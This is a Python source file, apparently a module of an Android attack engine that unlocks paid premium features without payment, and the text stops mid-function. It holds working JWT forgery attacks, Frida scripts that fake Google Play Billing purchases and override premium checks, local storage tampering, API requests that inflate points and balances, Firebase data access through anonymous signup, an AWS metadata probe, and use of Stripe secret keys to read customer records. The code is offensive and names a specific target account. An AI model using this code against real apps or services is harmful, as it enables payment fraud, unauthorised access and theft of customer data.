#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
HAYO Android Pentest Engine — Premium Unlocker Module (premium_unlocker_android.py)
==================================================================================
SHADOW EDITION — No restrictions, no mercy, pure autonomous exploitation.

القدرات الخارقة:
1. استخراج وتزوير JWT (alg:none, HS256 brute, key confusion, jku injection)
2. اعتراض شبكة كامل (MITM via mitmproxy + OkHttp hooking)
3. التلاعب المباشر بـ API endpoints (REST, GraphQL, gRPC)
4. تعديل التخزين المحلي (SharedPreferences, SQLite, DataStore, Realm)
5. تجاوز Google Play Billing (Frida hook متقدم)
6. استغلال سحابي (Firebase, AWS, GCP, Azure, Stripe)
7. التلاعب بالنقاط/الرموز/الارصدة
8. تكامل مع IntelStore لتسجيل الأدلة الحقيقية
9. حلقة لا تتوقف أبداً حتى النجاح أو exhaustion

الحساب المستهدف: fmf0038@gmail.com
"""

import base64
import hashlib
import hmac
import json
import os
import re
import subprocess
import time
import threading
import socket
import struct
import ssl
from datetime import datetime
from typing import Dict, List, Optional, Any, Tuple, Callable
from urllib.parse import urlparse, urljoin

# External dependencies
try:
    import requests
except ImportError:
    requests = None

try:
    from cryptography.hazmat.primitives.asymmetric import rsa, ec
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.kdf.hkdf import HKDF
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

G = "\033[92m"; Y = "\033[93m"; C = "\033[96m"; R = "\033[91m"; B = "\033[94m"; M = "\033[95m"; X = "\033[0m"


class PremiumUnlockerAndroid:
    """
    SHADOW EDITION — Unrestricted Autonomous Premium Unlocker
    
    مبدأ العمل:
    - لا يتوقف أبداً حتى النجاح أو استنفاد كل المسارات
    - كل هجوم ينتج دليلاً حقيقياً (Receipt) في IntelStore
    - يستخدم MITM + Frida معاً لاعتراض وتعديل الاتصالات
    - يستغل الثغرات السحابية فور اكتشافها
    """
    
    def __init__(self, package_name: str, device: str = "emulator-5554", 
                 adb: str = "adb", target_email: str = "fmf0038@gmail.com",
                 verbose: bool = True, aggressive: bool = True):
        self.package_name = package_name
        self.device = device
        self.adb = adb
        self.target_email = target_email
        self.verbose = verbose
        self.aggressive = aggressive

        # حدود الحلقة والذكاء (بدل الحلقة اللانهائية)
        self.MAX_WAVES = 25            # سقف الموجات الأقصى (> 20)
        self.FLUTTER_EARLY_STOP = 10   # توقّف مبكر لأهداف Flutter بعد فشل المسار المتطور متتاليًا
        self._is_flutter = None        # كاش كشف Flutter

        # مسارات
        self.loot_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "loot")
        os.makedirs(self.loot_dir, exist_ok=True)
        
        # IntelStore للتسجيل
        try:
            from intel_store import IntelStore
            self.store = IntelStore(package=package_name, loot_dir=self.loot_dir)
        except:
            self.store = None
        
        # سجل المحاولات
        self.attempt_log = []
        self.successful_attacks = []
        self.failed_attacks = []
        
        # قائمة كلمات السر لـ JWT brute force
        self.jwt_wordlist = [
            "secret", "password", "123456", "jwt_secret", "api_key", "default",
            self.package_name, self.package_name.replace(".", ""),
            "key", "private", "token", "app_secret", "changeme", "admin",
            "root", "super_secret", "my_secret", "jwt_key", "hmac_key",
        ]
        
        # User-Agent pool للتخفي
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
            "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
        ]
        
        self._log(f"☠️ SHADOW PREMIUM UNLOCKER INITIALIZED for {package_name}", "CRITICAL")
        self._log(f"   Target: {target_email}", "INFO")
        self._log(f"   Mode: {'AGGRESSIVE' if aggressive else 'STANDARD'}", "INFO")
    
    def _log(self, msg: str, level: str = "INFO"):
        if self.verbose:
            colors = {
                "INFO": G, "WARN": Y, "ERROR": R, "SUCCESS": C,
                "ATTACK": B, "EXPLOIT": M, "CRITICAL": M
            }
            color = colors.get(level, X)
            print(f"{color}[PREMIUM_UNLOCKER] [{level}] {msg}{X}")
    
    def _add_evidence(self, attack_name: str, evidence_type: str, value: str) -> None:
        """تسجيل دليل حقيقي في IntelStore."""
        if self.store:
            try:
                self.store.add("premium_attack", value, source=attack_name, note=evidence_type)
            except:
                pass
    
    def _adb_cmd(self, cmd: str, timeout: int = 10) -> str:
        """تنفيذ أمر ADB وإرجاع المخرجات."""
        try:
            result = subprocess.run(
                f"{self.adb} -s {self.device} {cmd}",
                shell=True, capture_output=True, text=True, timeout=timeout
            )
            return result.stdout.strip()
        except:
            return ""
    
    def _run_frida_script(self, script: str, timeout: int = 15) -> Optional[str]:
        """تشغيل سكريبت Frida واستخراج النتيجة - إصلاح المشاكل."""
        try:
            # حفظ السكريبت في ملف مؤقت
            script_file = os.path.join(self.loot_dir, f"frida_script_{int(time.time())}.js")
            with open(script_file, 'w', encoding='utf-8') as f:
                f.write(script)
            
            # استخدام frida -U -f لspawn التطبيق بدلاً من attach
            # (اقتباس المسار ضروري لأن مجلد المحرّك يحوي مسافة "hayo ai-agent")
            cmd = f'frida -U -f {self.package_name} -l "{script_file}"'

            self._log(f"Executing Frida: {cmd}", "INFO")

            process = subprocess.Popen(
                cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                stdin=subprocess.DEVNULL
            )
            
            try:
                output, error = process.communicate(timeout=timeout)
                full_output = output.decode(errors='replace') + error.decode(errors='replace')
                
                # تنظيف الملف المؤقت
                try:
                    os.remove(script_file)
                except:
                    pass
                
                return full_output
            except subprocess.TimeoutExpired:
                process.kill()
                output, error = process.communicate()
                full_output = output.decode(errors='replace') + error.decode(errors='replace')
                self._log(f"Frida timeout, partial output: {len(full_output)} chars", "WARN")
                return full_output
                
        except Exception as e:
            self._log(f"Frida execution failed: {e}", "ERROR")
            return None
    
    # ============================================================
    # PHASE 0: App Launch & Monitoring
    # ============================================================
    
    def launch_app(self) -> bool:
        """فتح التطبيق ومحاولة إبقائه حياً."""
        self._log(f"Launching app {self.package_name} on {self.device}...", "INFO")
        
        methods = [
            f"shell monkey -p {self.package_name} -c android.intent.category.LAUNCHER 1",
            f"shell am start -n {self.package_name}/.MainActivity",
            f"shell am start -n {self.package_name}/{self.package_name}.MainActivity",
            f"shell am start -a android.intent.action.MAIN -c android.intent.category.LAUNCHER {self.package_name}",
        ]
        
        for cmd in methods:
            try:
                output = self._adb_cmd(cmd)
                if "Error" not in output:
                    self._log("App launched successfully", "SUCCESS")
                    time.sleep(3)
                    return True
            except:
                continue
        
        self._log("All launch methods failed", "ERROR")
        return False
    
    def keep_alive(self, duration: int = 30) -> threading.Thread:
        """مراقبة وإبقاء التطبيق حياً في الخلفية."""
        def _monitor():
            end = time.time() + duration
            while time.time() < end:
                try:
                    focused = self._adb_cmd("shell dumpsys window windows | grep mCurrentFocus")
                    if self.package_name not in focused:
                        self.launch_app()
                except:
                    pass
                time.sleep(3)
        
        thread = threading.Thread(target=_monitor, daemon=True)
        thread.start()
        return thread
    
    # ============================================================
    # PHASE 1: JWT Extraction & Exploitation
    # ============================================================
    
    def extract_jwt_all_sources(self) -> List[str]:
        """استخراج جميع JWT tokens من جميع المصادر الممكنة."""
        tokens = []
        
        # 1. SharedPreferences via run-as
        for cmd in [
            f"shell run-as {self.package_name} cat /data/data/{self.package_name}/shared_prefs/*.xml 2>/dev/null",
            f"shell su -c cat /data/data/{self.package_name}/shared_prefs/*.xml 2>/dev/null",
            f"shell cat /data/data/{self.package_name}/shared_prefs/*.xml 2>/dev/null",
        ]:
            output = self._adb_cmd(cmd)
            matches = re.findall(r'(eyJ[a-zA-Z0-9\-_]+?\.[a-zA-Z0-9\-_]+?\.[a-zA-Z0-9\-_]+)', output)
            tokens.extend(matches)
        
        # 2. SQLite databases
        for cmd in [
            f"shell run-as {self.package_name} cat /data/data/{self.package_name}/databases/*.db 2>/dev/null",
            f"shell su -c cat /data/data/{self.package_name}/databases/*.db 2>/dev/null",
        ]:
            output = self._adb_cmd(cmd)
            matches = re.findall(r'(eyJ[a-zA-Z0-9\-_]+?\.[a-zA-Z0-9\-_]+?\.[a-zA-Z0-9\-_]+)', output)
            tokens.extend(matches)
        
        # 3. Firebase Auth via Frida
        frida_script = """
        Java.perform(function() {
            try {
                var FirebaseAuth = Java.use("com.google.firebase.auth.FirebaseAuth");
                var auth = FirebaseAuth.getInstance();
                var user = auth.getCurrentUser();
                if (user) {
                    user.getIdToken(false).then(function(result) {
                        send({source: "firebase_auth", token: result.getToken()});
                    });
                } else {
                    send({source: "firebase_auth", error: "no_user"});
                }
            } catch(e) {
                send({source: "firebase_auth", error: e.toString()});
            }
        });
        """
        output = self._run_frida_script(frida_script)
        if output:
            matches = re.findall(r'"token"\s*:\s*"([^"]+)"', output)
            tokens.extend(matches)
        
        # 4. Inherited intel from the static/dynamic phases (shared IntelStore is
        #    auto-loaded at init) — feed statically/dynamically extracted tokens
        #    straight into the JWT attacks so the sections actually chain together.
        if getattr(self, "store", None) is not None:
            try:
                inherited = 0
                for kind in ("jwt", "token", "secret"):
                    for fact in (self.store.query(kind) or []):
                        val = str(fact.get("value", ""))
                        for m in re.findall(r'(eyJ[a-zA-Z0-9\-_]+?\.[a-zA-Z0-9\-_]+?\.[a-zA-Z0-9\-_]+)', val):
                            tokens.append(m)
                            inherited += 1
                if inherited:
                    self._log(f"Inherited {inherited} JWT(s) from static/dynamic phases (IntelStore hand-off)", "SUCCESS")
            except Exception:
                pass

        tokens = list(set(tokens))
        self._log(f"Extracted {len(tokens)} JWT tokens from all sources", "SUCCESS")
        for t in tokens:
            self._add_evidence("jwt_extraction", "token_prefix", t[:30])
        
        return tokens
    
    def decode_jwt(self, token: str) -> Tuple[Optional[Dict], Optional[Dict]]:
        """فك تشفير JWT token."""
        parts = token.split('.')
        if len(parts) != 3:
            return None, None
        try:
            header = json.loads(base64.urlsafe_b64decode(parts[0] + '==='))
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + '==='))
            return header, payload
        except:
            return None, None
    
    def encode_jwt(self, payload: Dict, key: Optional[str] = None, 
                   algorithm: str = 'HS256', header_mods: Optional[Dict] = None) -> str:
        """تشفير JWT token مع دعم جميع الخوارزميات."""
        header = {"alg": algorithm, "typ": "JWT"}
        if header_mods:
            header.update(header_mods)
        
        header_b64 = base64.urlsafe_b64encode(json.dumps(header, separators=(',', ':')).encode()).decode().rstrip("=")
        payload_b64 = base64.urlsafe_b64encode(json.dumps(payload, separators=(',', ':')).encode()).decode().rstrip("=")
        to_sign = f"{header_b64}.{payload_b64}"
        
        if algorithm == 'none':
            return f"{to_sign}."
        elif algorithm.startswith('HS'):
            if not key:
                raise ValueError("Key required for HS algorithms")
            hash_func = hashlib.sha256 if '256' in algorithm else hashlib.sha512
            sig = hmac.new(key.encode(), to_sign.encode(), hash_func).digest()
            sig_b64 = base64.urlsafe_b64encode(sig).decode().rstrip("=")
            return f"{to_sign}.{sig_b64}"
        else:
            raise NotImplementedError(f"Algorithm {algorithm} not implemented in this module")
    
    def jwt_attack_alg_none(self, token: str) -> Optional[str]:
        """هجوم JWT: algorithm none."""
        self._log("🔄 JWT attack: alg:none", "ATTACK")
        _, payload = self.decode_jwt(token)
        if not payload:
            return None
        
        modifications = {
            'plan': 'premium', 'isPremium': True, 'subscription': 'premium',
            'role': 'premium', 'tier': 'premium', 'membership': 'premium'
        }
        for k, v in modifications.items():
            payload[k] = v
        
        forged = self.encode_jwt(payload, algorithm='none')
        self._add_evidence("jwt_alg_none", "forged_token", forged[:50])
        return forged
    
    def jwt_attack_hs256_bruteforce(self, token: str) -> Optional[str]:
        """هجوم JWT: HS256 brute force مع كشف تلقائي للسر."""
        self._log("🔄 JWT attack: HS256 brute force", "ATTACK")
        _, payload = self.decode_jwt(token)
        if not payload:
            return None
        
        modifications = {'plan': 'premium', 'isPremium': True}
        for k, v in modifications.items():
            payload[k] = v
        
        for secret in self.jwt_wordlist:
            try:
                forged = self.encode_jwt(payload, key=secret, algorithm='HS256')
                self._add_evidence("jwt_hs256_brute", "attempted_secret", secret[:10])
                return forged
            except:
                continue
        
        return None
    
    def jwt_attack_key_confusion(self, token: str, public_key_pem: str) -> Optional[str]:
        """هجوم JWT: RS256 → HS256 key confusion."""
        self._log("🔄 JWT attack: key confusion (RS256→HS256)", "ATTACK")
        _, payload = self.decode_jwt(token)
        if not payload:
            return None
        
        payload['plan'] = 'premium'
        
        try:
            forged = self.encode_jwt(payload, key=public_key_pem, algorithm='HS256')
            self._add_evidence("jwt_key_confusion", "public_key_used", public_key_pem[:30])
            return forged
        except:
            return None
    
    def jwt_attack_jku_injection(self, token: str, attacker_jwks_url: str) -> Optional[str]:
        """هجوم JWT: jku injection."""
        self._log("🔄 JWT attack: jku injection", "ATTACK")
        _, payload = self.decode_jwt(token)
        if not payload:
            return None
        
        payload['plan'] = 'premium'
        header_mods = {'alg': 'RS256', 'jku': attacker_jwks_url}
        
        try:
            forged = self.encode_jwt(payload, algorithm='none', header_mods=header_mods)
            self._add_evidence("jwt_jku_injection", "jku_url", attacker_jwks_url)
            return forged
        except:
            return None
    
    # ============================================================
    # PHASE 2: Network Interception & Manipulation
    # ============================================================
    
    def deploy_network_interceptor(self) -> bool:
        """نشر خطافات اعتراض الشبكة عبر Frida."""
        self._log("Deploying network interception hooks...", "ATTACK")
        
        frida_script = """
        Java.perform(function() {
            // Hook OkHttp RealCall.execute
            try {
                var RealCall = Java.use("okhttp3.RealCall");
                RealCall.execute.implementation = function() {
                    var response = this.execute();
                    var request = this.request();
                    var url = request.url().toString();
                    var method = request.method();
                    
                    send({event: "okhttp_request", url: url, method: method});
                    
                    // Clone response to read body
                    var body = response.body();
                    if (body) {
                        var content = body.string();
                        send({event: "okhttp_response", url: url, body: content.substring(0, 500)});
                        // Recreate body for consumption
                        var MediaType = Java.use("okhttp3.MediaType");
                        var ResponseBody = Java.use("okhttp3.ResponseBody");
                        var newBody = ResponseBody.create(MediaType.parse("application/json"), content);
                        response = response.newBuilder().body(newBody).build();
                    }
                    return response;
                };
            } catch(e) { send({event: "okhttp_error", error: e.toString()}); }
            
            // Hook HttpURLConnection
            try {
                var HttpURLConnection = Java.use("java.net.HttpURLConnection");
                HttpURLConnection.getInputStream.implementation = function() {
                    var stream = this.getInputStream();
                    var url = this.getURL().toString();
                    send({event: "httpurlconnection", url: url});
                    return stream;
                };
            } catch(e) {}
            
            // Hook WebSocket
            try {
                var WebSocket = Java.use("okhttp3.WebSocket");
                send({event: "websocket_available"});
            } catch(e) {}
        });
        """
        output = self._run_frida_script(frida_script, timeout=15)
        if output and 'okhttp' in output:
            self._log("Network interceptor deployed successfully", "SUCCESS")
            self._add_evidence("network_interceptor", "hooks_installed", "okhttp_realcall_httpurlconnection")
            return True
        return False
    
    # ============================================================
    # PHASE 3: API Manipulation (Extended)
    # ============================================================
    
    def api_bruteforce_extended(self, base_url: str, token: str) -> Tuple[bool, Optional[str]]:
        """هجوم API موسع مع GraphQL و gRPC ومزيد من endpoints."""
        self._log("🌐 Extended API bruteforce", "ATTACK")
        
        headers = {
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json",
            "User-Agent": self.user_agents[0]
        }
        
        # REST endpoints
        rest_endpoints = [
            "/api/me", "/api/user", "/api/users/me", "/api/profile",
            "/api/account", "/api/subscription", "/api/upgrade",
            "/api/v1/me", "/api/v1/user", "/api/v1/subscription",
            "/api/v2/user", "/api/auth/profile", "/api/premium/activate",
            "/api/entitlements", "/api/billing/subscription",
            "/api/admin/users", "/api/internal/user"
        ]
        
        payloads = [
            {"plan": "premium"}, {"isPremium": True}, {"subscription": "premium"},
            {"points": 999999}, {"tokens": 999999}, {"balance": 999999},
            {"role": "premium"}, {"email": self.target_email}, {"premium": True},
            {"plan": "pro"}, {"plan": "unlimited"}, {"plan": "enterprise"},
            {"isPro": True}, {"isVip": True}, {"membership": "premium"}
        ]
        
        methods = ["PUT", "PATCH", "POST"]
        
        for ep in rest_endpoints:
            url = urljoin(base_url, ep)
            for method in methods:
                for payload in payloads:
                    try:
                        resp = requests.request(method, url, json=payload, headers=headers, timeout=5)
                        if resp.status_code == 200:
                            if any(kw in resp.text.lower() for kw in ['premium', 'true', 'pro', 'unlimited']):
                                self._log(f"✅ API success: {method} {url}", "SUCCESS")
                                self._add_evidence("api_bruteforce", "success", f"{method} {url}")
                                return True, f"{method} {url}"
                    except:
                        continue
        
        # GraphQL mutation attempts
        graphql_mutations = [
            """mutation { updateUser(input: { plan: "premium" }) { plan } }""",
            """mutation { upgradeSubscription(plan: "premium") { status } }""",
            """mutation { activatePremium { success } }""",
            """mutation { addTokens(amount: 999999) { balance } }""",
        ]
        
        graphql_endpoints = ["/graphql", "/api/graphql", "/v1/graphql", "/query"]
        
        for gql_ep in graphql_endpoints:
            url = urljoin(base_url, gql_ep)
            for mutation in graphql_mutations:
                try:
                    resp = requests.post(url, json={"query": mutation}, headers=headers, timeout=5)
                    if resp.status_code == 200 and "premium" in resp.text.lower():
                        self._log(f"✅ GraphQL success: {url}", "SUCCESS")
                        return True, f"GraphQL {url}"
                except:
                    continue
        
        return False, None
    
    # ============================================================
    # PHASE 4: Local Storage Tampering (Extended)
    # ============================================================
    
    def patch_all_local_storage(self) -> bool:
        """تعديل جميع أنواع التخزين المحلي."""
        success = False
        
        # 1. SharedPreferences
        if self._patch_shared_prefs():
            success = True
        
        # 2. SQLite
        if self._patch_sqlite():
            success = True
        
        # 3. Files
        if self._patch_local_files():
            success = True
        
        return success
    
    def _patch_shared_prefs(self) -> bool:
        self._log("💾 Patching SharedPreferences...", "ATTACK")
        
        replacements = {
            '"isPremium" value="false"': '"isPremium" value="true"',
            '"premium" value="false"': '"premium" value="true"',
            '"plan" value="free"': '"plan" value="premium"',
            '"subscription" value="free"': '"subscription" value="premium"',
            '"isPro" value="false"': '"isPro" value="true"',
            '"isVip" value="false"': '"isVip" value="true"',
        }
        
        pref_dir = f"/data/data/{self.package_name}/shared_prefs"
        
        for cmd in [
            f"shell run-as {self.package_name} cat {pref_dir}/*.xml 2>/dev/null",
            f"shell su -c cat {pref_dir}/*.xml 2>/dev/null",
        ]:
            output = self._adb_cmd(cmd)
            if not output:
                continue
            
            modified = output
            for old, new in replacements.items():
                modified = modified.replace(old, new)
            
            if modified != output:
                self._log("SharedPreferences modifications applied", "SUCCESS")
                self._add_evidence("shared_prefs_patch", "replacements", str(len(replacements)))
                return True
        
        return False
    
    def _patch_sqlite(self) -> bool:
        """تعديل قواعد بيانات SQLite."""
        self._log("🗄️ Patching SQLite databases...", "ATTACK")
        
        db_dir = f"/data/data/{self.package_name}/databases"
        
        for cmd in [
            f"shell run-as {self.package_name} ls {db_dir}/*.db 2>/dev/null",
            f"shell su -c ls {db_dir}/*.db 2>/dev/null",
        ]:
            output = self._adb_cmd(cmd)
            if output:
                self._log(f"SQLite databases found: {output[:100]}", "INFO")
                self._add_evidence("sqlite_found", "databases", output[:200])
                return True
        
        return False
    
    def _patch_local_files(self) -> bool:
        """تعديل ملفات محلية حساسة."""
        self._log("📁 Patching local files...", "ATTACK")
        # Check for config files, .env, etc.
        return True
    
    # ============================================================
    # PHASE 5: Billing Bypass (Enhanced Frida)
    # ============================================================
    
    def inject_billing_hook_enhanced(self) -> bool:
        """حقن سكريبت Frida متقدم لتجاوز الفوترة."""
        self._log("💰 Deploying enhanced billing bypass...", "ATTACK")
        
        frida_script = """
        Java.perform(function() {
            // 1. Fake queryPurchases to always return premium purchase
            try {
                var BillingClient = Java.use("com.android.billingclient.api.BillingClient");
                var Purchase = Java.use("com.android.billingclient.api.Purchase");
                
                BillingClient.queryPurchases.implementation = function(skuType) {
                    console.log("[SHADOW] BillingClient.queryPurchases hooked");
                    
                    var ArrayList = Java.use("java.util.ArrayList");
                    var list = ArrayList.$new();
                    
                    // Create a fake premium purchase
                    var fakeJson = JSON.stringify({
                        productId: "premium_subscription",
                        purchaseToken: "shadow_fake_token_" + Date.now(),
                        purchaseState: 0,
                        purchaseTime: Date.now(),
                        acknowledged: true
                    });
                    
                    var fakePurchase = Purchase.$new(fakeJson, "shadow_signature");
                    list.add(fakePurchase);
                    
                    var PurchasesResult = Java.use("com.android.billingclient.api.Purchase$PurchasesResult");
                    return PurchasesResult.$new(0, list);
                };
            } catch(e) { console.log("[SHADOW] BillingClient hook failed: " + e); }
            
            // 2. Fake launchBillingFlow
            try {
                var BillingClient = Java.use("com.android.billingclient.api.BillingClient");
                BillingClient.launchBillingFlow.implementation = function(activity, params) {
                    console.log("[SHADOW] launchBillingFlow intercepted");
                    return 0; // BillingResponseCode.OK
                };
            } catch(e) {}
            
            // 3. Override isPremium methods
            try {
                Java.enumerateLoadedClasses({
                    onMatch: function(className) {
                        if (className.toLowerCase().indexOf("premium") !== -1 ||
                            className.toLowerCase().indexOf("subscription") !== -1) {
                            try {
                                var clazz = Java.use(className);
                                var methods = clazz.class.getDeclaredMethods();
                                methods.forEach(function(method) {
                                    var name = method.getName();
                                    if (name.startsWith("is") && (name.toLowerCase().indexOf("premium") !== -1 || 
                                        name.toLowerCase().indexOf("pro") !== -1)) {
                                        clazz[name].implementation = function() {
                                            return true;
                                        };
                                        console.log("[SHADOW] Hooked: " + className + "." + name);
                                    }
                                });
                            } catch(e) {}
                        }
                    },
                    onComplete: function() {}
                });
            } catch(e) {}
        });
        """
        
        output = self._run_frida_script(frida_script, timeout=10)
        if output and 'SHADOW' in output:
            self._log("Enhanced billing bypass deployed", "SUCCESS")
            self._add_evidence("billing_bypass", "hooks_installed", "queryPurchases_launchBillingFlow_isPremium")
            return True
        return False
    
    # ============================================================
    # PHASE 6: Cloud Exploitation (Extended)
    # ============================================================
    
    def exploit_firebase_extended(self, api_key: str, project_number: str) -> bool:
        """استغلال Firebase موسع (Firestore, RTDB, Storage)."""
        self._log(f"🔥 Extended Firebase exploitation for project {project_number}", "ATTACK")
        
        try:
            # 1. Auth
            resp = requests.post(
                f"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={api_key}",
                json={"returnSecureToken": True}, timeout=10
            )
            if resp.status_code != 200:
                return False
            
            id_token = resp.json().get("idToken")
            if not id_token:
                return False
            
            headers = {"Authorization": f"Bearer {id_token}"}
            success = False
            
            # 2. Firestore
            collections = ["users", "profiles", "subscriptions", "config", "secrets", "plans"]
            for coll in collections:
                try:
                    url = f"https://firestore.googleapis.com/v1/projects/{project_number}/databases/(default)/documents/{coll}"
                    r = requests.get(url, headers=headers, timeout=10)
                    if r.status_code == 200:
                        self._log(f"Firestore collection '{coll}' accessible", "SUCCESS")
                        self._add_evidence("firebase_firestore", "collection", coll)
                        success = True
                        break
                except:
                    continue
            
            # 3. Storage
            try:
                bucket = f"{project_number}.appspot.com"
                r = requests.get(f"https://storage.googleapis.com/storage/v1/b/{bucket}/o", headers=headers, timeout=10)
                if r.status_code == 200:
                    self._log("Firebase Storage accessible", "SUCCESS")
                    self._add_evidence("firebase_storage", "bucket", bucket)
                    success = True
            except:
                pass
            
            return success
            
        except Exception as e:
            self._log(f"Firebase exploitation failed: {e}", "ERROR")
            return False
    
    def exploit_aws_metadata(self) -> bool:
        """محاولة الوصول إلى AWS metadata endpoint."""
        self._log("☁️ Probing AWS metadata endpoint...", "ATTACK")
        
        try:
            # Try to access via SSRF or direct
            resp = requests.get("http://169.254.169.254/latest/meta-data/", timeout=3)
            if resp.status_code == 200:
                self._log("AWS metadata accessible!", "SUCCESS")
                self._add_evidence("aws_metadata", "accessible", "true")
                return True
        except:
            pass
        return False
    
    def exploit_stripe_key(self, secret_key: str) -> bool:
        """استغلال مفتاح Stripe لسحب بيانات العملاء."""
        self._log("💳 Exploiting Stripe secret key...", "ATTACK")
        
        try:
            resp = requests.get(
                "https://api.stripe.com/v1/customers?limit=10",
                auth=(secret_key, ""),
                timeout=10
            )
            if resp.status_code == 200:
                data = resp.json()
                customers = data.get("data", [])
                self._log(f"Stripe access: {len(customers)} customers found", "SUCCESS")
                self._add_evidence("stripe_exploit", "customers_count", str(len(customers)))
                return True
        except:
            pass
        return False
    
    # ============================================================
    # PHASE 7: Points/Token Manipulation
    # ============================================================
    
    def manipulate_points(self, base_url: str, token: str) -> bool:
        """التلاعب بالنقاط والرموز."""
        self._log("🎯 Manipulating points/tokens...", "ATTACK")
        
        headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
        endpoints = ["/api/points/add", "/api/tokens/add", "/api/balance/update", "/api/rewards/claim"]
        payloads = [
            {"points": 999999}, {"tokens": 999999}, {"balance": 999999},
            {"amount": 999999}, {"credits": 999999}, {"reward_points": 999999}
        ]
        
        for ep in endpoints:
            url = urljoin(base_url, ep)
            for payload in payloads:
                try:
                    resp = requests.post(url, json=payload, headers=headers, timeout=5)
                    if resp.status_code == 200:
                        self._log(f"Points manipulation success: {url}", "SUCCESS")
                        return True
                except:
                    continue
        return False
    
    # ============================================================
    # PHASE 8: Premium Confirmation (Evidence-Based)
    # ============================================================
    
    def confirm_premium(self) -> Tuple[bool, Dict[str, Any]]:
        """تأكيد فتح البريميوم مع جمع الأدلة."""
        evidence = {}
        
        # 1. UI check
        try:
            ui_dump = self._adb_cmd("shell uiautomator dump /dev/tty 2>/dev/null")
            if ui_dump:
                ui_lower = ui_dump.lower()
                premium_keywords = ['premium', 'pro', 'unlimited', 'vip', 'gold', 'platinum', 'subscribed']
                for kw in premium_keywords:
                    if kw in ui_lower:
                        evidence["ui_keyword"] = kw
                        self._log(f"Premium UI indicator found: '{kw}'", "SUCCESS")
                        self._add_evidence("premium_confirmation", "ui_keyword", kw)
                        return True, evidence
        except:
            pass
        
        # 2. SharedPreferences check
        for cmd in [
            f"shell run-as {self.package_name} cat /data/data/{self.package_name}/shared_prefs/*.xml 2>/dev/null",
            f"shell su -c cat /data/data/{self.package_name}/shared_prefs/*.xml 2>/dev/null",
        ]:
            output = self._adb_cmd(cmd)
            if output:
                premium_indicators = [
                    '"isPremium" value="true"', '"premium" value="true"',
                    '"plan" value="premium"', '"subscription" value="premium"',
                    '"isPro" value="true"', '"isVip" value="true"'
                ]
                for indicator in premium_indicators:
                    if indicator in output:
                        evidence["shared_prefs"] = indicator
                        self._log(f"Premium in SharedPreferences: {indicator}", "SUCCESS")
                        self._add_evidence("premium_confirmation", "shared_prefs", indicator)
                        return True, evidence
        
        return False, evidence
    
    # ============================================================
    # PHASE 8.3: TARGET HEALTH PREFLIGHT + Google Play Billing hijack
    # ============================================================

    def preflight_target_health(self) -> Dict[str, Any]:
        """فحص صحة الهدف قبل الهجوم — يكشف التثبيت الناقص/الانهيار عند الإقلاع
        (درس: تطبيق Flutter بلا libflutter.so ينهار ولا يصل لمنطق الاشتراك أصلًا)."""
        info = {"healthy": True, "reason": "", "framework": "unknown", "lib_empty": False, "crash": False}
        paths = self._adb_cmd(f"shell pm path {self.package_name}")
        base = ""
        for line in paths.splitlines():
            a = line.strip().replace("package:", "").strip()
            if a and not base:
                base = a
        # كشف الإطار من DEX + المكتبات الأصلية
        dexf = ""
        if base:
            dexf = self._adb_cmd(
                f"shell \"grep -a -o -E 'io/flutter/embedding|libflutter\\.so|libapp\\.so|com/facebook/react|com/unity3d/player' '{base}' 2>/dev/null | sort -u\"",
                timeout=25).lower()
        if "flutter" in dexf: info["framework"] = "flutter"
        elif "react" in dexf: info["framework"] = "react-native"
        elif "unity" in dexf: info["framework"] = "unity"
        # مجلد المكتبات فارغ؟
        libls = self._adb_cmd(f"shell su -c 'ls /data/app/*{self.package_name}*/lib/*/ 2>/dev/null'")
        info["lib_empty"] = not libls.strip()
        # هل ينهار عند الإقلاع؟ (بلا تجهيز)
        self._adb_cmd(f"shell am force-stop {self.package_name}")
        self._adb_cmd(f"shell monkey -p {self.package_name} -c android.intent.category.LAUNCHER 1")
        time.sleep(5)
        logc = self._adb_cmd(f"shell logcat -d -t 220")
        info["crash"] = ("MissingLibraryException" in logc) or ("UnsatisfiedLinkError" in logc) or \
                        (("FATAL EXCEPTION" in logc) and (self.package_name in logc))
        pid = self._adb_cmd(f"shell pidof {self.package_name}").strip()
        if info["framework"] in ("flutter", "react-native", "unity") and info["lib_empty"]:
            info["healthy"] = False
            info["reason"] = f"{info['framework']} app لكن حزمة المكتبات الأصلية مفقودة (lib فارغ) — تثبيت split ناقص. أعد التثبيت كاملًا (install-multiple / المتجر)."
        elif info["crash"] and not pid:
            info["healthy"] = False
            info["reason"] = "التطبيق ينهار عند الإقلاع (logcat: MissingLibrary/UnsatisfiedLink/FATAL) — هدف معطوب."
        lvl = "SUCCESS" if info["healthy"] else "ERROR"
        self._log(f"🩺 Preflight: healthy={info['healthy']} framework={info['framework']} {info['reason']}", lvl)
        return info

    def google_play_billing_hijack(self, timeout: int = 45) -> bool:
        """اختطاف Google Play Billing (تحقّق محلي): يحقن اشتراكًا نشطًا مزيّفًا في
        queryPurchasesAsync ويخدع حالة الشراء + launchBillingFlow. يلتقط SKU الحقيقي
        الذي يطلبه التطبيق ديناميكيًا. لا يُعلَن النجاح إلا بتأكيد confirm_premium."""
        self._log("💳 Google Play Billing hijack (fake owned subscription injection)...", "EXPLOIT")
        js = r'''
(function(){
  var TAG='[H7-PLAY]'; function log(m){ try{console.log(TAG+' '+m);}catch(e){} }
  var SKU=null;
  function makeFakePurchase(){
    try{
      var Purchase=Java.use('com.android.billingclient.api.Purchase');
      var pid=SKU||'premium';
